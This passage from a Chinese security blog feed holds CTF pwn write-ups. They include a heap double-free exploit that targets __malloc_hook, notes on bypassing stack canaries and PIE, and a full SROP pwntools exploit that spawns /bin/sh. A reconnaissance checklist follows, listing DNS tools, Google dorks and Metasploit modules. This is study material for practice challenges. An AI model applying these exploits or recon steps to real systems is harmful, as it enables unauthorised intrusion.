class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh = process(&quot;./pwn&quot;)</span><br><span class="line">#sh = remote(&quot;172.29.21.114&quot;, 8888)</span><br><span class="line"># todo check libc version</span><br><span class="line">libc = ELF(&quot;libc-2.23.so&quot;, checksec = False)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.sendafter(&quot;name?&quot;,&quot;a&quot;*7+&quot;b&quot;)</span><br><span class="line">sh.recvuntil(&quot;ab&quot;)</span><br><span class="line">addr = u64(sh.recv(6) +&quot;\x00&quot;*2)-0x6fdbd</span><br><span class="line">print(hex(addr))</span><br><span class="line">sh.sendlineafter(&quot;ID.&quot;,&quot;123&quot;)</span><br><span class="line"></span><br><span class="line">def add(size, content):</span><br><span class="line">    sh.sendlineafter(&quot;choice:&quot;, &quot;1&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;story:&quot;,str(size))</span><br><span class="line">    sh.sendafter(&quot;story&quot;, content)</span><br><span class="line"></span><br><span class="line">def remove(index):</span><br><span class="line">    sh.sendlineafter(&quot;choice:&quot;,&quot;4&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;dex:&quot;,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x68, &quot;123&quot;)</span><br><span class="line">add(0x68, &quot;123&quot;)</span><br><span class="line">remove(0)</span><br><span class="line">remove(1)</span><br><span class="line">remove(0)</span><br><span class="line"></span><br><span class="line">add(0x68, p64(addr+libc.symbols[&quot;__malloc_hook&quot;]-35))</span><br><span class="line">add(0x68,&quot;aaa&quot;)</span><br><span class="line">add(0x68,&quot;bbb&quot;)</span><br><span class="line">add(0x68,&quot;a&quot;*19+p64(addr+0xf1147))#0xf02a4))</span><br><span class="line"></span><br><span class="line">#add(0x10,&apos;a&apos;)</span><br><span class="line">#remove(0)</span><br><span class="line">#remove(0)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;pwn2&quot;&gt;&lt;a href=&quot;#pwn2&quot; class=&quot;headerlink&quot; title=&quot;pwn2&quot;&gt;&lt;/a&gt;pwn2&lt;/h1&gt;&lt;h2 id=&quot;题目-amp-amp-分析&quot;&gt;&lt;a href=&quot;#题目-amp-amp-分析&quot; class=&quot;headerlink
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="stack" scheme="http://siriuswhiter.tk/tags/stack/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>Bypass Protect</title>
    <link href="http://siriuswhiter.tk/2019/05/29/bypass-protect/"/>
    <id>http://siriuswhiter.tk/2019/05/29/bypass-protect/</id>
    <published>2019-05-29T15:11:48.000Z</published>
    <updated>2019-06-07T02:40:29.819Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h1><p>canary用来检测栈溢出,程序正常的走完了流程，到函数执行完的时候，程序会再次从一个神奇的地方把canary的值取出来，和之前放在栈上的canary进行比较，如果因为栈溢出什么的原因覆盖到了canary而导致canary发生了变化则直接终止程序。canary的最低位恒为零，使得不存在截断问题。</p><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><p>通过格式化字符串读取canary的值，然后在栈溢出的padding块把canary所在位置的值用正确的canary替换，从而绕过canary的检测。<br>或者直接任意地址写覆盖返回地址之类的也可以绕过。</p><h2 id="针对fork的进程"><a href="#针对fork的进程" class="headerlink" title="针对fork的进程"></a>针对fork的进程</h2><p>对fork而言，作用相当于自我复制，每一次复制出来的程序，内存布局都是一样的，当然canary值也一样。那我们就可以逐位爆破，如果程序GG了就说明这一位不对，如果程序正常就可以接着跑下一位，直到跑出正确的canary。</p><h2 id="ssp-leak（Stack-Smashing-Protector-）"><a href="#ssp-leak（Stack-Smashing-Protector-）" class="headerlink" title="ssp leak（Stack Smashing Protector ）"></a>ssp leak（Stack Smashing Protector ）</h2><p>如果canary被我们的值覆盖而发生了变化，程序会执行函数___stack_chk_fail()</p><p>___stack_chk_fail()源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">void </span><br><span class="line">__attribute__ ((noreturn)) </span><br><span class="line">__stack_chk_fail (void) &#123;   </span><br><span class="line">__fortify_fail (&quot;stack smashing detected&quot;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void </span><br><span class="line">__attribute__ ((noreturn)) </span><br><span class="line">__fortify_fail (msg)</span><br><span class="line">   const char *msg; &#123;</span><br><span class="line">      /* The loop is added only to keep gcc happy. */</span><br><span class="line">         while (1)</span><br><span class="line">              __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;, msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;) </span><br><span class="line">&#125; </span><br><span class="line">libc_hidden_def (__fortify_fail)</span><br></pre></td></tr></table></figure></p><p>__libc_message 的第二个%s输出的是argv[0]，argv[0]是指向第一个启动参数字符串的指针，会在栈中存放，只要能够输入足够长的字符串覆盖掉argv[0]，我们就能让canary保护输出我们想要地址上的值。</p><h2 id="Modify-the-TLS"><a href="#Modify-the-TLS" class="headerlink" title="Modify the TLS"></a>Modify the TLS</h2><p>正常情况下，canary取值是:<br>32 bits:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov     eax, large gs:14h</span><br><span class="line">mov     [ebp+var_C], eax</span><br></pre></td></tr></table></figure></p><p>64 bits:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov     rax, fs:28h</span><br><span class="line">mov     [rbp+var_8], rax</span><br></pre></td></tr></table></figure></p><p>而段寄存器fs &amp;&amp; gs的定义是指向本线程的TLS结构</p><p>在vvar与 /lib/x86_64-linux-gnu/ld-2.23.so之间的一段空间,可以看到有写权限<br>64位一般在该段的起始地址＋0x1700+0x28处 /  32位      +0x14<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">          0x400000           0x401000 r-xp     1000 0      /home/sirius/tikool/prac/canary/canary_test</span><br><span class="line">          0x600000           0x601000 r--p     1000 0      /home/sirius/tikool/prac/canary/canary_test</span><br><span class="line">          0x601000           0x602000 rw-p     1000 1000   /home/sirius/tikool/prac/canary/canary_test</span><br><span class="line">    0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dd1000     0x7ffff7dd3000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000 0      </span><br><span class="line">    0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7fda000     0x7ffff7fdd000 rw-p     3000 0      </span><br><span class="line">    0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]</span><br><span class="line">    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 25000  /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 26000  /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      </span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x/10gx 0x7ffff7fda000+0x1700</span><br><span class="line">0x7ffff7fdb700:0x00007ffff7fdb7000x00007ffff7fda010</span><br><span class="line">0x7ffff7fdb710:0x00007ffff7fdb7000x0000000000000000</span><br><span class="line">0x7ffff7fdb720:0x00000000000000000x2928659c8989cd00</span><br><span class="line">0x7ffff7fdb730:0xb97e5185f9afb6be0x0000000000000000</span><br><span class="line">0x7ffff7fdb740:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><h1 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h1><p>PIE(position-independent executable, 地址无关可执行文件)技术是一个针对代码段.text, 数据段.*data，.bss等固定地址的一个防护技术。同ASLR一样，应用了PIE的程序会在每次加载时都变换加载基址，从而使位于程序本身的gadget也失效。</p><h2 id="partial-write"><a href="#partial-write" class="headerlink" title="partial write"></a>partial write</h2><p>由于内存的页载入机制，PIE的随机化只能影响到单个内存页。通常来说，一个内存页大小为0x1000，这就意味着不管地址怎么变，某条指令的后12位，3个十六进制数的地址是始终不变的。因此通过覆盖EIP的后8或16位 (按字节写入，每字节8位)就可以快速爆破或者直接劫持EIP。</p><h2 id="leak-libc-addr"><a href="#leak-libc-addr" class="headerlink" title="leak libc addr"></a>leak libc addr</h2><p>PIE影响的只是程序加载基址，并不会影响指令间的相对地址，因此我们如果能泄露出程序或libc的某些地址，我们就可以利用偏移来达到目的。这也是比较常用的方法。</p><h2 id="vdso-vsyscall"><a href="#vdso-vsyscall" class="headerlink" title="vdso/vsyscall"></a>vdso/vsyscall</h2><p>在开启了ASLR的系统上运行PIE程序，就意味着所有的地址都是随机化的。然而在某些版本的系统中这个结论并不成立，原因是存在着一个神奇的vsyscall。（由于vsyscall在一部分发行版本中的内核已经被裁减掉了，新版的kali也属于其中之一。vsyscall在内核中实现，无法用docker模拟，因此任何与vsyscall相关的实验都改成在Ubuntu 16.04上进行，同时libc中的偏移需要进行修正）</p><p>关于vsyscall<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">简单地说，现代的Windows/*Unix操作系统都采用了分级保护的方式，内核代码位于R0，用户代码位于R3。许多对硬件和内核等的操作都会被包装成内核函数并提供一个接口给用户层代码调用，这个接口就是我们熟知的int 0x80/syscall+调用号模式。当我们每次调用这个接口时，为了保证数据的隔离，我们需要把当前的上下文(寄存器状态等)保存好，然后切换到内核态运行内核函数，然后将内核函数返回的结果放置到对应的寄存器和内存中，再恢复上下文，切换到用户模式。这一过程需要耗费一定的性能。对于某些系统调用，如gettimeofday来说，由于他们经常被调用，如果每次被调用都要这么来回折腾一遍，开销就会变成一个累赘。因此系统把几个常用的无参内核调用从内核中映射到用户空间中，这就是vsyscall</span><br></pre></td></tr></table></figure></p><p>由于vsyscall地址的固定性，这个本来是为了节省开销的设置造成了很大的隐患，因此vsyscall很快就被新的机制vdso所取代。与vsyscall不同的是，vdso的地址也是随机化的，且其中的指令可以任意执行，不需要从入口开始，这就意味着我们可以利用vdso中的syscall来干一些坏事了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Canary&quot;&gt;&lt;a href=&quot;#Canary&quot; class=&quot;headerlink&quot; title=&quot;Canary&quot;&gt;&lt;/a&gt;Canary&lt;/h1&gt;&lt;p&gt;canary用来检测栈溢出,程序正常的走完了流程，到函数执行完的时候，程序会再次从一个神奇的地方把canar
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="stack" scheme="http://siriuswhiter.tk/tags/stack/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>Introduction to pwn1.5--SROP</title>
    <link href="http://siriuswhiter.tk/2019/05/24/introduction-to-pwn1-5-srop/"/>
    <id>http://siriuswhiter.tk/2019/05/24/introduction-to-pwn1-5-srop/</id>
    <published>2019-05-24T08:35:36.000Z</published>
    <updated>2019-05-30T08:52:48.225Z</updated>
    
    <content type="html"><![CDATA[<p><em>这学期真实忙成狗，再加上之前状态不好，这学期pwn方向的技术没有太大进展，更多的是在查缺补漏，稳固基础</em></p><h1 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>之前没去看过，现在抽时间来看一下，原理比想象中的更简单一些，比较容易理解。<br>ctfwiki上的： <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop/#signal" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop/#signal</a></p><p>这里直接使用wiki上的说法：</p><figure class="image-box">                <img src="/2019/05/24/introduction-to-pwn1-5-srop/rt_signal.png" alt="rt_signal" title="" class="">                <p>rt_signal</p>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。</span><br><span class="line"></span><br><span class="line">1. 内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</span><br><span class="line"></span><br><span class="line">2. 内核会为该进程保存相应的上下文，主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</span><br><span class="line"></span><br><span class="line">3. signal handler 返回后，内核为执行 sigreturn 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 77，64 位的系统调用号为 15。</span><br></pre></td></tr></table></figure><p>简单来讲就是unix系统在传递signal信息时，会将进程信息以Signal Frame 的格式保存在用户态空间的栈中，而且在回调时并不会有任何检查，所以只要能够改变其结构中的关键数据，就可以使得在恢复进程执行时获得shell或者其他系统调用。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><ul><li>利用条件</li></ul><ol><li>足够的栈溢出以存放sigal frame结构体（ps: 不一定要放在栈中</li><li>需要知道： <ul><li>“/bin/sh”</li><li>Signal Frame</li><li>syscall</li><li>sigreturn</li></ul></li></ol><ul><li>利用方式<br>pwntools中实现了SROP的库，这样就免去了自己费劲构造结构体的过程</li></ul><p>格式：(设置结构体中保存的需要修改的寄存器即可)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = stack_addr + 0x120  # &quot;/bin/sh&quot; &apos;s addr</span><br><span class="line">sigframe.rsi = 0x0</span><br><span class="line">sigframe.rdx = 0x0</span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br></pre></td></tr></table></figure></p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>源代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line"></span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">xor     rax, rax;</span><br><span class="line">mov     edx, 400h;</span><br><span class="line">mov     rsi, rsp;</span><br><span class="line">mov     rdi, rax;</span><br><span class="line">syscall;</span><br><span class="line">retn;</span><br></pre></td></tr></table></figure></p><p>编译链接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nasm srop.asm -f elf64</span><br><span class="line">ld -m elf_x86_64 srop.o -o srop</span><br></pre></td></tr></table></figure></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>就是一个调用read系统调用的函数，在栈顶输入0x400个字节，这里我们使用srop来看</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">small = ELF(&apos;./srop&apos;)</span><br><span class="line">sh = process(&apos;./srop&apos;)</span><br><span class="line"></span><br><span class="line">context.arch = &apos;amd64&apos;</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">syscall_ret = 0x000000000040008E</span><br><span class="line">start_addr = 0x0000000000400080</span><br><span class="line">## set start addr three times</span><br><span class="line">payload = p64(start_addr) * 3</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">## modify the return addr to start_addr+3</span><br><span class="line">## so that skip the xor rax,rax; then the rax=1</span><br><span class="line">## get stack addr</span><br><span class="line">sh.send(&apos;\x83&apos;)</span><br><span class="line">stack_addr = u64(sh.recv()[8:16])</span><br><span class="line">log.success(&apos;leak stack addr :&apos; + hex(stack_addr))</span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">## make the rsp point to stack_addr</span><br><span class="line">## the frame is read(0,stack_addr,0x400)</span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_read</span><br><span class="line">sigframe.rdi = 0</span><br><span class="line">sigframe.rsi = stack_addr</span><br><span class="line">sigframe.rdx = 0x400</span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line">payload = p64(start_addr) + &apos;a&apos; * 8 + str(sigframe)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">## set rax=15 and call sigreturn</span><br><span class="line">sigreturn = p64(syscall_ret) + &apos;b&apos; * 7</span><br><span class="line">sh.send(sigreturn)</span><br><span class="line"></span><br><span class="line">## call execv(&quot;/bin/sh&quot;,0,0)</span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = stack_addr + 0x120  # &quot;/bin/sh&quot; &apos;s addr</span><br><span class="line">sigframe.rsi = 0x0</span><br><span class="line">sigframe.rdx = 0x0</span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line"></span><br><span class="line">frame_payload = p64(start_addr) + &apos;b&apos; * 8 + str(sigframe)</span><br><span class="line">print len(frame_payload)</span><br><span class="line">payload = frame_payload + (0x120 - len(frame_payload)) * &apos;\x00&apos; + &apos;/bin/sh\x00&apos;</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.send(sigreturn)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;这学期真实忙成狗，再加上之前状态不好，这学期pwn方向的技术没有太大进展，更多的是在查缺补漏，稳固基础&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;SROP&quot;&gt;&lt;a href=&quot;#SROP&quot; class=&quot;headerlink&quot; title=&quot;SROP&quot;&gt;&lt;/a&gt;SROP&lt;/
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="stack" scheme="http://siriuswhiter.tk/tags/stack/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试--信息收集篇</title>
    <link href="http://siriuswhiter.tk/2019/05/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%AF%87/"/>
    <id>http://siriuswhiter.tk/2019/05/23/渗透测试-信息收集篇/</id>
    <published>2019-05-23T07:13:51.000Z</published>
    <updated>2019-05-24T13:11:32.815Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DNS-IP-挖掘信息"><a href="#DNS-IP-挖掘信息" class="headerlink" title="DNS+IP 挖掘信息"></a>DNS+IP 挖掘信息</h1><h2 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h2><p>whois + domainname<br><a href="http://whois.chinaz.com/" target="_blank" rel="noopener">http://whois.chinaz.com/</a></p><p>nslookup</p><p>dig</p><p>fierce 工具暴力破解dns： fierce -dns weburl</p><h2 id="ip2location"><a href="#ip2location" class="headerlink" title="ip2location"></a>ip2location</h2><p><a href="https://www.maxmind.com/en/home" target="_blank" rel="noopener">https://www.maxmind.com/en/home</a></p><p>国内ip查询 <a href="http://www.cz88.net/" target="_blank" rel="noopener">http://www.cz88.net/</a></p><p><a href="https://www.ip-adress.com/" target="_blank" rel="noopener">https://www.ip-adress.com/</a></p><p>google map 查询</p><h2 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询"></a>子域名查询</h2><p><a href="http://searchdns.netcraft.com" target="_blank" rel="noopener">http://searchdns.netcraft.com</a></p><p><a href="https://toolbar.netcraft.com/site_report" target="_blank" rel="noopener">https://toolbar.netcraft.com/site_report</a>    站点信息</p><p>Layer子域名挖掘机</p><p>dmitry信息收集工具: dmitry -winse weburl</p><h2 id="ip2domain"><a href="#ip2domain" class="headerlink" title="ip2domain"></a>ip2domain</h2><p><a href="https://www.ip-adress.com/reverse-ip-lookup" target="_blank" rel="noopener">https://www.ip-adress.com/reverse-ip-lookup</a></p><p>国内 不仅是信息反查： <a href="http://www.7c.com/" target="_blank" rel="noopener">http://www.7c.com/</a></p><h1 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h1><h2 id="google-hacking"><a href="#google-hacking" class="headerlink" title="google hacking"></a>google hacking</h2><p>GDHB 谷歌黑客数据库： <a href="https://www.exploit-db.com/google-hacking-database" target="_blank" rel="noopener">https://www.exploit-db.com/google-hacking-database</a>  </p><p>自动化工具：</p><ol><li>SiteDigger  </li><li>Search Diggity ： <a href="https://www.bishopfox.com/resources/tools/google-hacking-diggity/attack-tools/" target="_blank" rel="noopener">https://www.bishopfox.com/resources/tools/google-hacking-diggity/attack-tools/</a></li><li>gooscan</li></ol><p>检索特定类型的文件 google:  site:sitename filetype: typename, 可能含有敏感文件</p><p>Email泄露网站信息：  metasploit: search_email_collector 模块</p><p>搜索可能存在漏洞的界面，如登陆界面可能存在SQL注入： google: site:sitename inurl:login </p><h2 id="网站目录探索"><a href="#网站目录探索" class="headerlink" title="网站目录探索"></a>网站目录探索</h2><ol><li>google： parent directory site:sitename   // 不是特别好用</li><li>暴力搜索</li></ol><p>metasploit: brute_dirs, dir_listing, dir_scanner<br>工具：御剑，wwwscan， dirbuster，cansina</p><ol start="3"><li>robots.txt 所指出的不应当被抓取的目录及文件</li></ol><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>漏洞搜索引擎：</p><ol><li><a href="https://fofa.so/" target="_blank" rel="noopener">https://fofa.so/</a></li><li><a href="https://www.shodan.io/" target="_blank" rel="noopener">https://www.shodan.io/</a></li></ol><p>工具：</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DNS-IP-挖掘信息&quot;&gt;&lt;a href=&quot;#DNS-IP-挖掘信息&quot; class=&quot;headerlink&quot; title=&quot;DNS+IP 挖掘信息&quot;&gt;&lt;/a&gt;DNS+IP 挖掘信息&lt;/h1&gt;&lt;h2 id=&quot;域名信息&quot;&gt;&lt;a href=&quot;#域名信息&quot; class=&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>信安大赛2019-pwn</title>
    <link href="http://siriuswhiter.tk/2019/04/22/%E4%BF%A1%E5%AE%89%E5%A4%A7%E8%B5%9B2019-pwn/"/>
    <id>http://siriuswhiter.tk/2019/04/22/信安大赛2019-pwn/</id>
    <published>2019-04-22T12:01:10.000Z</published>
    <updated>2019-04-23T05:17:51.058Z</updated>
    
    <content type="html"><![CDATA[<p><em>太菜了，堆的题要么找不到洞，要么找不到好的思路，得加紧训练</em></p><h1 id="your-pwn"><a href="#your-pwn" class="headerlink" title="your_pwn"></a>your_pwn</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>关键函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">  memset(&amp;s, 0, 0x100uLL);</span><br><span class="line">  memset(arr, 0, 0x28uLL);</span><br><span class="line">  for ( i = 0; i &lt;= 40; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;input index&quot;);</span><br><span class="line">    __isoc99_scanf(&quot;%d&quot;, &amp;idx);</span><br><span class="line">    printf(&quot;now value(hex) %x\n&quot;, (unsigned int)arr[idx]);</span><br><span class="line">    puts(&quot;input new value&quot;);</span><br><span class="line">    __isoc99_scanf(&quot;%d&quot;, &amp;new_v);</span><br><span class="line">    arr[idx] = new_v;</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;do you want continue(yes/no)? &quot;);</span><br><span class="line">  read(0, &amp;s, 0x100uLL);</span><br><span class="line">  return strncmp(&amp;s, &quot;yes&quot;, 3uLL) == 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>原意是可以给arr的每个地址赋新值，但是因为其没有对idx进行限制，因而相当于任意地址写，同时因为其会先将地址处的值显示出来，因而可以先泄露地址</p><p>通过泄露栈中的libc_start_main+240,得到libc基址同时查询得到libc版本为2.23，因此可以直接计算处one_adget 